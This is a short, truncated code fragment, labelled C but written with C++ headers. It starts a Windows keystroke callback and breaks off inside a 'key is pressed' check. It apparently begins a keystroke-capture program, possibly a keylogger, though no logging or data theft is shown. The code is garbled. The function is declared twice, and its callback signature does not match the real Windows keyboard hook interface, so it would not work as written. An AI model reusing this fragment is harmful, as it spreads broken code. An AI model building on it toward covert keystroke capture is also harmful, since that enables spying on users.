### Code Implementation

```c
#include <Windows.h>
#include <WinUser.h>
#include <stdio.h>
#include <ctime>
#include <iostream>

using namespace std;

void KeyStrokeCallback(int hID, int nCode, unsigned long lParam, unsigned int time, DWORD state, int context);

void KeyStrokeCallback(int hID, int nCode, unsigned long lParam, unsigned int time, DWORD state, int context) {
    if (state & (1 << 0)) { // Key is pressed
